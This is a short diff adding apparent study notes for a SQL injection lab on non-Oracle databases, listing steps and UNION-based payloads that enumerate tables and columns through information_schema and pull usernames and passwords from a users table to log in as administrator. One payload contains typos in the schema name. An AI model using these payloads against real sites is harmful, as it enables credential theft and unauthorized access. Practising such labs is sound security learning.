@@ -1,0 +1,15 @@
+- SQL injection attack, listing the database contents on non-Oracle databases
+- Determine the table that contains usernames and passwords
+- Determine the relevant columns
+- Output the content of the table
+- Login as the administrator user
+
+payload- 
+" ' union select table_name, null from information_schema.tables--"
+" ' union select column_name, null from information.scehma.column where column_name='<column_name>'-- "
+
+password_dbvobk
+username_mcamiw
+
+' UNION select username_mcamiw, password_dbvobk from users_ebcosz--
+
